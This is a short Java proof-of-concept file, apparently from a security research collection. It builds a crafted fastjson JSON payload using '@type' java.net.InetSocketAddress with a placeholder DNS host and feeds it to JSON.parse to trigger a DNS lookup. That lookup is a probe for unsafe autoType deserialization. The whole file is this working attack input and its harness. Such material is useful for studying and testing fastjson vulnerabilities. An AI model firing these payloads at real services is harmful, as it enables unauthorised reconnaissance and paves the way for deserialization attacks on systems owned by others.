package com.threedr3am.bug.fastjson.dns;

import com.alibaba.fastjson.JSON;

/**
 * @author threedr3am
 */
public class InetSocketAddressPoc {

    public static void main(String[] args) {
        String payload = "{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"xxx.dns\"}, \"port\":80}";
        try {
            JSON.parse(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
